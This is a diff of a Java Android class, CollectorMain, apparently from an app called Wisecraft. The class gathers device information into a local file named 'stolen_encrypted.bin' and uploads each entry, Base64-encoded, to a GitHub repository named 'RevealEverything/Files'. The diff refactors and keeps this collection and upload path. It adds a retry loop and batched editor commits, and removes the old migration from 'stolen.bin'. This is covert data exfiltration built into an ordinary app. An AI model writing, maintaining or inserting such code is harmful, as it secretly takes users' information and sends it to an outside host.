@@ -24,6 +24,7 @@ import org.eclipse.egit.github.core.service.ContentsService;
 import org.eclipse.egit.github.core.service.RepositoryService;
 
 import static com.nao20010128nao.Wisecraft.Utils.*;
+import android.content.SharedPreferences;
 
 public class CollectorMain extends ContextWrapper implements Runnable {
 	static boolean running=false;
@@ -42,21 +43,12 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		}
 		BinaryPrefImpl sb;
 		String uuid=TheApplication.instance.uuid;
-		try {
-			if(new File(getFilesDir(), "stolen.bin").exists()){
-				//encrypt the file
-				Log.d("CollectorMain","migrating");
-				stolenInfos = new BinaryPrefImpl(new File(getFilesDir(), "stolen.bin"));
-				stolenInfos=new HeavilyEncryptedBinaryPrefImpl(stolenInfos.getAll());
-				Utils.writeToFileByBytes(new File(getFilesDir(), "stolen_encrypted.bin"),stolenInfos.toBytes());
-				new File(getFilesDir(), "stolen.bin").delete();
-				Log.d("CollectorMain","done");
+		while(true){
+			try {
+				sb=new FileLinkedHeavilyBinaryPrefImpl(new File(getFilesDir(), "stolen_encrypted.bin"));
+				break;
+			} catch (IOException e) {
 			}
-			if (stolenInfos == null)
-				stolenInfos = new HeavilyEncryptedBinaryPrefImpl(new File(getFilesDir(), "stolen_encrypted.bin"));
-			sb=stolenInfos;
-		} catch (IOException e) {
-			sb=new HeavilyEncryptedBinaryPrefImpl();
 		}
 		running = true;
 		try {
@@ -64,8 +56,9 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 			Repository repo=null;
 			List<RepositoryContents> cont=null;
 			String s="";
+			SharedPreferences.Editor edt=sb.edit();
 			try {
-				sb.edit().putString(System.currentTimeMillis() + ".json", new Gson().toJson(new Infos())).commit();
+				edt.putString(System.currentTimeMillis() + ".json", new Gson().toJson(new Infos()));
 			} catch (Throwable e) {
 
 			} finally {
@@ -101,30 +94,20 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 						params.put("content", Base64.encodeToString(file, Base64.NO_WRAP));
 						ghc.put("/repos/RevealEverything/Files/contents/" + filename, params, TypeToken.get(ContentUpload.class).getType());
 						Log.d("CollectorMain", "uploaded");
-						sb.edit().remove(actual).apply();
+						edt.remove(actual);
 				    } catch (Throwable e) {
 						DebugWriter.writeToE("CollectorMain",e);
 						continue;
 					}
 				}
+				edt.commit();
 			} catch (Throwable e) {
 
 			}
 		} catch (Throwable e) {
 
 		} finally {
-			FileOutputStream fos=null;
-			try {
-				fos = new FileOutputStream(new File(getFilesDir(), "stolen_encrypted.bin"));
-				fos.write(sb.toBytes());
-			} catch (IOException e) {
-				DebugWriter.writeToE("CollectorMain",e);
-			} finally {
-				try {
-					if (fos != null)fos.close();
-				} catch (IOException e) {}
-				running = false;
-			}
+			running=false;
 			for (String s:sb.getAll().keySet()) {
 				Log.d("remain", s);
 			}
